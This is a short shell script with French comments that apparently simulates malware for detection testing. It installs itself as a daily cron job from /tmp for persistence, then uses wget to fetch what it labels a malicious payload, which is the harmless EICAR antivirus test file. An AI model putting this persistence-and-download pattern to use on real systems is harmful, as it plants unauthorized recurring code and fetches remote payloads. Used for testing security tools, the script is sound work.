#!/bin/sh

#Persistance
cp ./test.sh /tmp/test.sh
crontab -l > mycron
echo "0 0 * * * /tmp/test.sh" >> mycron
crontab mycron
rm mycron

#Téléchargement charge malveillante
wget 'https://secure.eicar.org/eicar.com.txt'
